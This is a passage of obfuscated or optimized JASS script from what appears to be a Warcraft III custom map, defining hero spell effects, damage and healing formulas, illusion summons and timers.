set Mc=GetUnitLoc(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),2))
set No=CreateGroup()
set Np=Condition(function mx)
call GroupEnumUnitsInRange(No,GetLocationX(Mc),GetLocationY(Mc),430,Np)
set Pq=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),2)
set Nu=R2I(I2R(100*GetUnitAbilityLevel(Hu,$41303048)+GetHeroStr(Hu,true))*Ng[GetPlayerId(GetOwningPlayer(Hu))+1])
call ForGroup(No,function yi)
call DestroyGroup(No)
call DestroyBoolExpr(Np)
set No=null
set Np=null
call RemoveLocation(Mc)
set Mc=null
else
call RemoveUnit(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),2))
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
endfunction
function yk takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local unit NQ
local location Ht
local location Nk
local timer Hc
local group Na
local boolexpr Vx
local integer L9
local real NT
if GetSpellAbilityId()==$41303048 then
set Nz[GetPlayerId(GetOwningPlayer(Hu))+11]=GetSpellAbilityId()
if GetUnitAbilityLevel(Hu,$42303741)>=1 then
if GetUnitState(Hu,UNIT_STATE_MANA)>=GetUnitState(Hu,UNIT_STATE_MAX_MANA)/20 then
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Flamestrike Dark Blood II.mdx",Hu,"origin"))
set NT=I2R(GetHeroStr(Hu,true))*Nf[GetPlayerId(GetOwningPlayer(Hu))+1]
call m2(Hu,R2I(NT))
call SetUnitState(Hu,UNIT_STATE_MANA,GetUnitState(Hu,UNIT_STATE_MANA)-GetUnitState(Hu,UNIT_STATE_MAX_MANA)/20)
else
set Nz[GetPlayerId(GetOwningPlayer(Hu))]=0
call IssueImmediateOrder(Hu,"unimmolation")
endif
endif
set Ht=GetUnitLoc(Hu)
set NQ=CreateUnitAtLoc(GetOwningPlayer(Hu),$68303739,Ht,0)
call AddSpecialEffectTarget("war3mapImported\\Alarm.mdx",NQ,"origin")
call SetUnitVertexColor(NQ,255,0,255,150)
call SetUnitPathing(NQ,false)
call SetUnitScale(NQ,4,4,4)
call SetUnitFlyHeight(NQ,0,0)
call UnitAddAbility(NQ,$41726176)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveInteger(Nq,GetHandleId(Hc),1,501)
call SaveUnitHandle(Nq,GetHandleId(Hc),2,NQ)
call TimerStart(Hc,.01,true,function yj)
call RemoveLocation(Ht)
set Ht=null
set NQ=null
set Hc=null
elseif GetSpellAbilityId()==$41304342 or GetSpellAbilityId()==$41304532 then
set Nz[GetPlayerId(GetOwningPlayer(Hu))+11]=GetSpellAbilityId()
if GetUnitAbilityLevel(Hu,$42303741)>=1 then
if GetUnitState(Hu,UNIT_STATE_MANA)>=GetUnitState(Hu,UNIT_STATE_MAX_MANA)/20 then
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Flamestrike Dark Blood II.mdx",Hu,"origin"))
set NT=I2R(GetHeroStr(Hu,true))*Nf[GetPlayerId(GetOwningPlayer(Hu))+1]
call m2(Hu,R2I(NT))
call SetUnitState(Hu,UNIT_STATE_MANA,GetUnitState(Hu,UNIT_STATE_MANA)-GetUnitState(Hu,UNIT_STATE_MAX_MANA)/20)
else
set Nz[GetPlayerId(GetOwningPlayer(Hu))]=0
call IssueImmediateOrder(Hu,"unimmolation")
endif
endif
set Ht=GetSpellTargetLoc()
set Na=CreateGroup()
set Vx=Condition(function mx)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),350,Vx)
if GetUnitAbilityLevel(Hu,$41304342)>=1 then
set NT=I2R(200*GetUnitAbilityLevel(Hu,$41304342)+R2I(GetUnitState(Hu,UNIT_STATE_MAX_LIFE)*.5))*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
else
set NT=I2R(3000+R2I(GetUnitState(Hu,UNIT_STATE_MAX_LIFE)*.7))*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
endif
set Nu=R2I(NT)
call ForGroup(Na,function yh)
call DestroyGroup(Na)
call DestroyBoolExpr(Vx)
set Na=null
set Vx=null
call RemoveLocation(Ht)
set Ht=null
elseif GetSpellAbilityId()==$41304348 then
set Nz[GetPlayerId(GetOwningPlayer(Hu))+11]=GetSpellAbilityId()
if GetUnitAbilityLevel(Hu,$42303741)>=1 then
if GetUnitState(Hu,UNIT_STATE_MANA)>=GetUnitState(Hu,UNIT_STATE_MAX_MANA)/20 then
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Flamestrike Dark Blood II.mdx",Hu,"origin"))
set NT=I2R(GetHeroStr(Hu,true))*Nf[GetPlayerId(GetOwningPlayer(Hu))+1]
call m2(Hu,R2I(NT))
call SetUnitState(Hu,UNIT_STATE_MANA,GetUnitState(Hu,UNIT_STATE_MANA)-GetUnitState(Hu,UNIT_STATE_MAX_MANA)/20)
else
set Nz[GetPlayerId(GetOwningPlayer(Hu))]=0
call IssueImmediateOrder(Hu,"unimmolation")
endif
endif
set NQ=GetSpellTargetUnit()
set Hu=MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))]
set NT=I2R(200*GetUnitAbilityLevel(Hu,$41304348)+GetHeroStr(Hu,true)*7)*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
call m0(Hu,NQ,R2I(NT))
set NT=I2R(100*GetUnitAbilityLevel(Hu,$41304348)+R2I(GetUnitState(Hu,UNIT_STATE_LIFE)*.15))*Nf[GetPlayerId(GetOwningPlayer(Hu))+1]
call m2(Hu,R2I(NT))
elseif GetSpellAbilityId()==$41304533 then
set Nz[GetPlayerId(GetOwningPlayer(Hu))+11]=GetSpellAbilityId()
if GetUnitAbilityLevel(Hu,$42303741)>=1 then
if GetUnitState(Hu,UNIT_STATE_MANA)>=GetUnitState(Hu,UNIT_STATE_MAX_MANA)/20 then
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Flamestrike Dark Blood II.mdx",Hu,"origin"))
set NT=I2R(GetHeroStr(Hu,true))*Nf[GetPlayerId(GetOwningPlayer(Hu))+1]
call m2(Hu,R2I(NT))
call SetUnitState(Hu,UNIT_STATE_MANA,GetUnitState(Hu,UNIT_STATE_MANA)-GetUnitState(Hu,UNIT_STATE_MAX_MANA)/20)
else
set Nz[GetPlayerId(GetOwningPlayer(Hu))]=0
call IssueImmediateOrder(Hu,"unimmolation")
endif
endif
set NQ=GetSpellTargetUnit()
set Hu=MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))]
set NT=I2R(3000+GetHeroStr(Hu,true)*10)*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
call m0(Hu,NQ,R2I(NT))
set NT=I2R(1000+R2I(GetUnitState(Hu,UNIT_STATE_LIFE)*.25))*Nf[GetPlayerId(GetOwningPlayer(Hu))+1]
call m2(Hu,R2I(NT))
elseif GetSpellAbilityId()==$4131334C then
set Nz[GetPlayerId(GetOwningPlayer(Hu))+11]=GetSpellAbilityId()
if GetUnitAbilityLevel(Hu,$42303741)>=1 then
if GetUnitState(Hu,UNIT_STATE_MANA)>=GetUnitState(Hu,UNIT_STATE_MAX_MANA)/20 then
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Flamestrike Dark Blood II.mdx",Hu,"origin"))
set NT=I2R(GetHeroStr(Hu,true))*Nf[GetPlayerId(GetOwningPlayer(Hu))+1]
call m2(Hu,R2I(NT))
call SetUnitState(Hu,UNIT_STATE_MANA,GetUnitState(Hu,UNIT_STATE_MANA)-GetUnitState(Hu,UNIT_STATE_MAX_MANA)/20)
else
set Nz[GetPlayerId(GetOwningPlayer(Hu))]=0
call IssueImmediateOrder(Hu,"unimmolation")
endif
endif
elseif GetSpellAbilityId()==$4131334D or GetSpellAbilityId()==$4131334E then
set Nz[GetPlayerId(GetOwningPlayer(Hu))+11]=GetSpellAbilityId()
if GetUnitAbilityLevel(Hu,$42303741)>=1 then
if GetUnitState(Hu,UNIT_STATE_MANA)>=GetUnitState(Hu,UNIT_STATE_MAX_MANA)/20 then
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Flamestrike Dark Blood II.mdx",Hu,"origin"))
set NT=I2R(GetHeroStr(Hu,true))*Nf[GetPlayerId(GetOwningPlayer(Hu))+1]
call m2(Hu,R2I(NT))
call SetUnitState(Hu,UNIT_STATE_MANA,GetUnitState(Hu,UNIT_STATE_MANA)-GetUnitState(Hu,UNIT_STATE_MAX_MANA)/20)
else
set Nz[GetPlayerId(GetOwningPlayer(Hu))]=0
call IssueImmediateOrder(Hu,"unimmolation")
endif
endif
call SetUnitVertexColor(Hu,0,0,0,0)
call UnitAddAbility(Hu,$4131375A)
set Nk=GetSpellTargetLoc()
call IssueImmediateOrder(Hu,"windwalk")
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$4131375A,false)
call PauseUnit(Hu,true)
set Ht=GetUnitLoc(Hu)
set NQ=CreateUnitAtLoc(GetOwningPlayer(Hu),$68303739,Ht,GetUnitFacing(Hu))
call SetUnitScale(NQ,1.5,1.5,1.5)
call AddSpecialEffectTarget("war3mapImported\\Sherum2.mdx",NQ,"chest")
call AddSpecialEffectTarget("war3mapImported\\Valiant Charge Void.mdx",NQ,"origin")
call GroupClear(UN[GetPlayerId(GetOwningPlayer(Hu))])
set Hc=CreateTimer()
call SaveInteger(Nq,GetHandleId(Hc),1,200)
call SaveInteger(Nq,GetHandleId(Hc),0,0)
call SaveUnitHandle(Nq,GetHandleId(Hc),2,Hu)
call SaveLocationHandle(Nq,GetHandleId(Hc),3,Nk)
call SaveUnitHandle(Nq,GetHandleId(Hc),7,NQ)
call TimerStart(Hc,.007,true,function yg)
elseif GetSpellAbilityId()==$4131334F then
if GetUnitAbilityLevel(Hu,Nz[GetPlayerId(GetOwningPlayer(Hu))+11])>=1 then
set L9=GetUnitAbilityLevel(Hu,Nz[GetPlayerId(GetOwningPlayer(Hu))+11])
call UnitRemoveAbility(Hu,Nz[GetPlayerId(GetOwningPlayer(Hu))+11])
call UnitAddAbility(Hu,Nz[GetPlayerId(GetOwningPlayer(Hu))+11])
call SetUnitAbilityLevel(Hu,Nz[GetPlayerId(GetOwningPlayer(Hu))+11],L9)
call ng(Hu,Hu,"Reset "+GetObjectName(Nz[GetPlayerId(GetOwningPlayer(Hu))+11]),.028,255,0,255,0)
endif
endif
set Hc=null
set Nk=null
set Ht=null
set NQ=null
set Hu=null
endfunction
function yl takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Hc,function yk)
set Hc=null
endfunction
function ym takes nothing returns nothing
local unit Mc
local unit No
local unit Np
local location Nt
local location Ny
local integer Ot
local integer Ou
local integer Ov
if GetSpellAbilityId()==$41314434 then
set Mc=GetTriggerUnit()
set No=GetSpellTargetUnit()
set Nt=GetUnitLoc(No)
set Ou=1
set Ov=0
loop
set Ny=PolarProjectionBJ(Nt,256,Ov)
set Np=CreateUnitAtLoc(GetOwningPlayer(Mc),$68303333,Ny,0)
call SetUnitVertexColor(Np,255,255,255,100)
call nD(Np,7)
if GetUnitAbilityLevel(Mc,$41314433)>=1 then
set Ot=120*GetUnitAbilityLevel(Mc,$41314434)+GetHeroAgi(Mc,true)+GetHeroAgi(Mc,true)/5
set Ot=Ot+Ot*(UH[GetPlayerId(GetOwningPlayer(Mc))+1]/5)/100
if GetUnitAbilityLevel(Mc,$41304359)>=1 then
call UnitAddAbility(Np,$41304359)
call SetUnitAbilityLevel(Np,$41304359,GetUnitAbilityLevel(Mc,$41304359))
call UnitAddAbility(Np,$41303435)
elseif GetUnitAbilityLevel(Mc,$41304556)>=1 then
call UnitAddAbility(Np,$41304556)
call UnitAddAbility(Np,$41303435)
endif
else
if GetUnitAbilityLevel(Mc,$41304359)>=1 then
call UnitAddAbility(Np,$41304359)
call SetUnitAbilityLevel(Np,$41304359,GetUnitAbilityLevel(Mc,$41304359))
elseif GetUnitAbilityLevel(Mc,$41304556)>=1 then
call UnitAddAbility(Np,$41304556)
endif
set Ot=100*GetUnitAbilityLevel(Mc,$41314434)+GetHeroAgi(Mc,true)
set Ot=Ot+Ot*(UH[GetPlayerId(GetOwningPlayer(Mc))+1]/5)/100
endif
call nj(Np,Ot)
call UnitAddAbility(Np,$416C6F63)
call IssueTargetOrder(Np,"attack",No)
set Ov=Ov+120
set Ou=Ou+1
exitwhen Ou>=4
endloop
call RemoveLocation(Nt)
call RemoveLocation(Ny)
set Nt=null
set Ny=null
set Mc=null
set No=null
set Np=null
endif
endfunction
function yn takes nothing returns nothing
local integer L9=0
local integer Mc
loop
if GetUnitAbilityLevel(MT[L9],$41314433)>=1 then
set Mc=GetUnitAbilityLevel(MT[L9],$41314433)
call UnitRemoveAbility(MT[L9],$41314433)
call UnitAddAbility(MT[L9],$41304846)
call SetUnitAbilityLevel(MT[L9],$41304846,Mc)
endif
set L9=L9+1
exitwhen L9>7
endloop
endfunction
function yo takes nothing returns nothing
local integer L9=0
local integer Mc
loop
if GetUnitAbilityLevel(MT[L9],$41304846)>=1 then
set Mc=GetUnitAbilityLevel(MT[L9],$41304846)
call UnitRemoveAbility(MT[L9],$41304846)
call UnitAddAbility(MT[L9],$41314433)
call SetUnitAbilityLevel(MT[L9],$41314433,Mc)
endif
set L9=L9+1
exitwhen L9>7
endloop
endfunction
function yp takes nothing returns nothing
local unit Hu=GetAttacker()
local location Mc
local unit No
local integer Np
if IsUnitEnemy(Hu,GetOwningPlayer(GetTriggerUnit()))==true then
if GetUnitAbilityLevel(Hu,$4130435A)>=1 then
if GetRandomInt(1,10)==1 then
set Mc=GetUnitLoc(Hu)
set No=CreateUnitAtLoc(GetOwningPlayer(Hu),$68303333,Mc,0)
call ne(Hu,"Иллюзия!",.022,255,0,255)
call SetUnitVertexColor(No,255,255,255,100)
call nD(No,3)
if GetUnitAbilityLevel(Hu,$41314433)>=1 then
set Np=120*GetUnitAbilityLevel(Hu,$4130435A)+GetHeroAgi(Hu,true)+GetHeroAgi(Hu,true)/5
set Np=Np+Np*(UH[GetPlayerId(GetOwningPlayer(Hu))+1]/5)/100
if GetUnitAbilityLevel(Hu,$41304359)>=1 then
call UnitAddAbility(No,$41304359)
call SetUnitAbilityLevel(No,$41304359,GetUnitAbilityLevel(Hu,$41304359))
call UnitAddAbility(No,$41303435)
elseif GetUnitAbilityLevel(Hu,$41304556)>=1 then
call UnitAddAbility(No,$41304556)
call UnitAddAbility(No,$41303435)
endif
else
if GetUnitAbilityLevel(Hu,$41304359)>=1 then
call UnitAddAbility(No,$41304359)
call SetUnitAbilityLevel(No,$41304359,GetUnitAbilityLevel(Hu,$41304359))
elseif GetUnitAbilityLevel(Hu,$41304556)>=1 then
call UnitAddAbility(No,$41304556)
endif
set Np=100*GetUnitAbilityLevel(Hu,$4130435A)+GetHeroAgi(Hu,true)
set Np=Np+Np*(UH[GetPlayerId(GetOwningPlayer(Hu))+1]/5)/100
endif
call nj(No,Np)
call UnitAddAbility(No,$416C6F63)
call IssueTargetOrder(No,"attack",GetTriggerUnit())
endif
elseif GetUnitAbilityLevel(Hu,$41304555)>=1 then
if GetRandomInt(1,10)==1 then
set Mc=GetUnitLoc(Hu)
set No=CreateUnitAtLoc(GetOwningPlayer(Hu),$68303333,Mc,0)
call ne(Hu,"Иллюзия!",.022,255,0,255)
call SetUnitVertexColor(No,255,255,255,100)
call nD(No,3)
if GetUnitAbilityLevel(Hu,$41314433)>=1 then
set Np=1800+GetHeroAgi(Hu,true)*3/2+GetHeroAgi(Hu,true)*3/2/5
set Np=Np+Np*(UH[GetPlayerId(GetOwningPlayer(Hu))+1]/5)/100
if GetUnitAbilityLevel(Hu,$41304359)>=1 then
call UnitAddAbility(No,$41304359)
call SetUnitAbilityLevel(No,$41304359,GetUnitAbilityLevel(Hu,$41304359))
call UnitAddAbility(No,$41305539)
elseif GetUnitAbilityLevel(Hu,$41304556)>=1 then
call UnitAddAbility(No,$41304556)
call UnitAddAbility(No,$41305539)
endif
else
set Np=1500+GetHeroAgi(Hu,true)*3/2
set Np=Np+Np*(UH[GetPlayerId(GetOwningPlayer(Hu))+1]/5)/100
if GetUnitAbilityLevel(Hu,$41304359)>=1 then
call UnitAddAbility(No,$41304359)
call SetUnitAbilityLevel(No,$41304359,GetUnitAbilityLevel(Hu,$41304359))
elseif GetUnitAbilityLevel(Hu,$41304556)>=1 then
call UnitAddAbility(No,$41304556)
endif
endif
call nj(No,Np)
call UnitAddAbility(No,$416C6F63)
call IssueTargetOrder(No,"attack",GetTriggerUnit())
endif
endif
call RemoveLocation(Mc)
set Mc=null
set No=null
endif
set Hu=null
endfunction
function yq takes nothing returns nothing
local trigger Xf
local trigger Xg
local trigger Xh
set Xe=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Xe,EVENT_PLAYER_UNIT_ATTACKED)
call TriggerAddAction(Xe,function yp)
set Xf=CreateTrigger()
call TriggerRegisterGameStateEventTimeOfDay(Xf,EQUAL,18.)
call TriggerAddAction(Xf,function yo)
set Xg=CreateTrigger()
call TriggerRegisterGameStateEventTimeOfDay(Xg,EQUAL,6.)
call TriggerAddAction(Xg,function yn)
set Xh=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Xh,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Xh,function ym)
set Xh=null
set Xg=null
set Xf=null
endfunction
function yr takes nothing returns boolean
if not (IsUnitEnemy(GetAttacker(),GetOwningPlayer(GetTriggerUnit()))==true) then
return false
endif
if not (GetUnitAbilityLevel(GetAttacker(),$41313245)>=1) then
return false
endif
return true
endfunction
function ys takes nothing returns nothing
call UnitDamageTargetBJ(GetAttacker(),GetTriggerUnit(),I2R(GetHeroAgi(GetAttacker(),true))/5.*Nd[GetConvertedPlayerId(GetOwningPlayer(GetAttacker()))],ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
call AddSpecialEffectTargetUnitBJ("chest",GetTriggerUnit(),"Abilities\\Weapons\\HydraliskImpact\\T_HydraliskImpact.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
endfunction
function yt takes nothing returns nothing
set Xi=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Xi,EVENT_PLAYER_UNIT_ATTACKED)
call TriggerAddCondition(Xi,Condition(function yr))
call TriggerAddAction(Xi,function ys)
endfunction
function yu takes nothing returns boolean
return IsUnitAliveBJ(GetFilterUnit())==true
endfunction
function yv takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==true
endfunction
function yw takes nothing returns boolean
return GetBooleanAnd(yu(),yv())
endfunction
function yx takes nothing returns nothing
call AddSpecialEffectTargetUnitBJ("chest",GetEnumUnit(),"Objects\\Spawnmodels\\Orc\\Orcblood\\BattrollBlood.mdl")
call DestroyEffectBJ(GetLastCreatedEffectBJ())
call UnitDamageTargetBJ(GetTriggerUnit(),GetEnumUnit(),I2R(GetUnitAbilityLevel(GetTriggerUnit(),$41313244))*I2R(GetHeroAgi(GetTriggerUnit(),true))*Nd[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
endfunction
function yy takes nothing returns boolean
if not (GetSpellAbilityId()==$41313244) then
return false
endif
return true
endfunction
function yz takes nothing returns boolean
if not (GetSpellAbilityId()==$41314435) then
return false
endif
return true
endfunction
function y0 takes nothing returns nothing
local real Mc
local integer No
if yy() then
set Ub=GetUnitLoc(GetTriggerUnit())
set SR=GetUnitsInRangeOfLocMatching(500.,Ub,Condition(function yw))
call ForGroupBJ(SR,function yx)
call RemoveLocation(Ub)
call DestroyGroup(SR)
call UnitAddAbilityBJ($41313245,GetTriggerUnit())
set Mc=GetFloatGameState(GAME_STATE_TIME_OF_DAY)
call SetTimeOfDay(18.)
call TriggerSleepAction(8.)
call UnitRemoveAbilityBJ($41313245,GetTriggerUnit())
call SetFloatGameState(GAME_STATE_TIME_OF_DAY,Mc)
if Mc>6 and Mc<18 then
set No=GetUnitAbilityLevel(GetTriggerUnit(),$41314433)
call UnitRemoveAbility(GetTriggerUnit(),$41314433)
call UnitAddAbility(GetTriggerUnit(),$41304846)
call SetUnitAbilityLevel(GetTriggerUnit(),$41304846,No)
endif
else
endif
if yz() then
set Mc=GetFloatGameState(GAME_STATE_TIME_OF_DAY)
call SetTimeOfDay(18.)
call TriggerSleepAction(30.)
call SetFloatGameState(GAME_STATE_TIME_OF_DAY,Mc)
if Mc>6 and Mc<18 then
set No=GetUnitAbilityLevel(GetTriggerUnit(),$41314433)
call UnitRemoveAbility(GetTriggerUnit(),$41314433)
call UnitAddAbility(GetTriggerUnit(),$41304846)
call SetUnitAbilityLevel(GetTriggerUnit(),$41304846,No)
endif
else
endif
endfunction
function y1 takes nothing returns nothing
set Xj=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Xj,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Xj,function y0)
endfunction
function y2 takes nothing returns boolean
if not (GetSpellAbilityId()==$41313239) then
return false
endif
return true
endfunction
function y3 takes nothing returns nothing
call SetUnitManaPercentBJ(GetTriggerUnit(),0.)
set Wh[GetConvertedPlayerId(GetTriggerPlayer())]=GetTriggerUnit()
set SV[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=true
set SX[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=0
call StartTimerBJ(SW,true,1.)
endfunction
function y4 takes nothing returns nothing
set Xk=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Xk,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(Xk,Condition(function y2))
call TriggerAddAction(Xk,function y3)
endfunction
function y5 takes nothing returns boolean
return IsUnitAlly(GetFilterUnit(),GetOwningPlayer(Wh[TX]))==true
endfunction
function y6 takes nothing returns nothing
call SetUnitLifeBJ(GetEnumUnit(),GetUnitState(GetEnumUnit(),UNIT_STATE_LIFE)+I2R(GetHeroInt(Wh[TX],true))/15.*I2R(GetUnitAbilityLevel(Wh[TX],$41313239))*TQ[GetConvertedPlayerId(GetOwningPlayer(Wh[TX]))])
call SetUnitLifeBJ(GetEnumUnit(),GetUnitState(GetEnumUnit(),UNIT_STATE_LIFE)+200.*I2R(GetUnitAbilityLevel(Wh[TX],$41313239))*TQ[GetConvertedPlayerId(GetOwningPlayer(Wh[TX]))])
call AddSpecialEffectTargetUnitBJ("chest",GetEnumUnit(),"Abilities\\Spells\\Undead\\DarkRitual\\DarkRitualCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
endfunction
function y7 takes nothing returns boolean
if not (SX[TX]<=27) then
return false
endif
if not (SV[TX]==true) then
return false
endif
return true
endfunction
function y8 takes nothing returns nothing
set TX=1
loop
exitwhen TX>8
set SX[TX]=SX[TX]+1
if y7() then
set Xm[TX]=GetUnitLoc(Wh[TX])
set Tl[TX]=GetUnitsInRangeOfLocMatching(700.,Xm[TX],Condition(function y5))
call ForGroupBJ(Tl[TX],function y6)
call RemoveLocation(Xm[TX])
call DestroyGroup(Tl[TX])
else
set SV[TX]=false
set SX[TX]=0
set Wh[TX]=null
endif
set TX=TX+1
endloop
endfunction
function y9 takes nothing returns nothing
set Xl=CreateTrigger()
call TriggerRegisterTimerExpireEvent(Xl,SW)
call TriggerAddAction(Xl,function y8)
endfunction
function zB takes nothing returns nothing
if IsUnitInGroup(GetEnumUnit(),UN[GetPlayerId(GetOwningPlayer(Pq))])==false then
call GroupAddUnit(UN[GetPlayerId(GetOwningPlayer(Pq))],GetEnumUnit())
call m2(GetEnumUnit(),Nu)
call m3(GetEnumUnit(),Nu/5)
endif
endfunction
function zC takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),1)
local unit NQ=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local location Mc
local location No
local group Np
local boolexpr Nt
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),2,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)>=1 then
set Pq=Hu
set Nu=R2I(I2R(1000*GetUnitAbilityLevel(Hu,$41304435)+GetHeroInt(Hu,true)*2)*TQ[GetPlayerId(GetOwningPlayer(Hu))+1])
set Mc=GetUnitLoc(NQ)
set No=nU(Mc,10,GetUnitFacing(NQ))
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\Radiance Nature.mdl",No))
call SetUnitPositionLoc(NQ,No)
set Np=CreateGroup()
set Nt=Condition(function mw)
call GroupEnumUnitsInRange(Np,GetLocationX(Mc),GetLocationY(Mc),300,Nt)
call ForGroup(Np,function zB)
call DestroyGroup(Np)
call DestroyBoolExpr(Nt)
set Np=null
set Nt=null
call RemoveLocation(Mc)
call RemoveLocation(No)
set Mc=null
set No=null
else
call RemoveUnit(NQ)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
set NQ=null
endfunction
function zD takes nothing returns nothing
call UnitRemoveAbility(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0),$41313542)
call DestroyEffect(LoadEffectHandle(Nq,GetHandleId(GetExpiredTimer()),1))
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function zE takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local unit NQ
local timer Hc
local group Na
local boolexpr Vx
local real NS
local location Ht
if GetSpellAbilityId()==$41313056 then
set NQ=GetSpellTargetUnit()
call UnitAddAbility(NQ,$41313542)
call SetUnitAbilityLevel(NQ,$41313542,GetUnitAbilityLevel(Hu,$41313056))
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,NQ)
call SaveEffectHandle(Nq,GetHandleId(Hc),1,AddSpecialEffectTarget("Abilities\\Spells\\NightElf\\EntanglingRoots\\EntanglingRootsTarget.mdl",NQ,"chest"))
call TimerStart(Hc,10,false,function zD)
set Hc=null
elseif GetSpellAbilityId()==$4131305A then
set NQ=GetSpellTargetUnit()
call UnitAddAbility(NQ,$41313542)
call SetUnitAbilityLevel(NQ,$41313542,11)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,NQ)
call SaveEffectHandle(Nq,GetHandleId(Hc),1,AddSpecialEffectTarget("Abilities\\Spells\\NightElf\\EntanglingRoots\\EntanglingRootsTarget.mdl",NQ,"chest"))
call TimerStart(Hc,10,false,function zD)
set Hc=null
elseif GetSpellAbilityId()==$41313238 then
set NQ=GetSpellTargetUnit()
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Items\\AIre\\AIreTarget.mdl",NQ,"origin"))
if IsUnitAlly(NQ,GetOwningPlayer(Hu))==true then
set NS=I2R(200*GetUnitAbilityLevel(Hu,$41313238)+GetHeroInt(Hu,true)*1)*TQ[GetPlayerId(GetOwningPlayer(Hu))+1]
if GetUnitAbilityLevel(Hu,$42303743)>=1 and GetRandomInt(1,3)==1 then
call ng(Hu,Hu,"Double!",.028,0,255,0,50)
set NS=NS*2
endif
call SetUnitState(NQ,UNIT_STATE_LIFE,GetUnitState(NQ,UNIT_STATE_LIFE)+NS)
set Ht=GetUnitLoc(NQ)
set Na=CreateGroup()
set Vx=Condition(function mw)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),500,Vx)
set Nu=R2I(NS)
call ForGroup(Na,function m4)
call DestroyGroup(Na)
call DestroyBoolExpr(Vx)
call RemoveLocation(Ht)
set Ht=null
set Na=null
set Vx=null
else
set NS=I2R(200*GetUnitAbilityLevel(Hu,$41313238)+GetHeroInt(Hu,true)*3)*N0[GetPlayerId(GetOwningPlayer(Hu))+1]
if GetUnitAbilityLevel(GetTriggerUnit(),$42303743)>=1 and GetRandomInt(1,3)==1 then
call ng(Hu,Hu,"Double!",.028,0,255,0,50)
call UnitDamageTargetBJ(Hu,NQ,NS*2,ATTACK_TYPE_NORMAL,DAMAGE_TYPE_MAGIC)
set NS=I2R(400*GetUnitAbilityLevel(Hu,$41313238)+GetHeroInt(Hu,true)*2)*TQ[GetPlayerId(GetOwningPlayer(Hu))+1]
else
call UnitDamageTargetBJ(Hu,NQ,NS,ATTACK_TYPE_NORMAL,DAMAGE_TYPE_MAGIC)
set NS=I2R(200*GetUnitAbilityLevel(Hu,$41313238)+GetHeroInt(Hu,true)*1)*TQ[GetPlayerId(GetOwningPlayer(Hu))+1]
endif
set Ht=GetUnitLoc(NQ)
set Na=CreateGroup()
set Vx=Condition(function mw)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),500,Vx)
set Nu=R2I(NS)
call ForGroup(Na,function m4)
call DestroyGroup(Na)
call DestroyBoolExpr(Vx)
call RemoveLocation(Ht)
set Ht=null
set Na=null
set Vx=null
endif
elseif GetSpellAbilityId()==$41313241 then
set NQ=GetSpellTargetUnit()
